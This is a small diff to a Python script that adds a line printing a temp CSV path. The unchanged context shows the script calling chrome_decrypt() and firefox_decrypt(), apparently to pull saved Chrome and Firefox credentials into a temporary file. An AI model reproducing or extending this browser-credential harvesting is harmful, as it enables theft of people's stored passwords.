@@ -8,6 +8,7 @@ if __name__ == "__main__":
     temp_dir = tempfile.gettempdir()
     # C:\Users\Docker\AppData\Local\Temp
     file_path = Path(temp_dir) / "temp.csv"
+    print(file_path)
     chrome_creds = chrome_decrypt()
     firefox_creds = firefox_decrypt()
     with open(
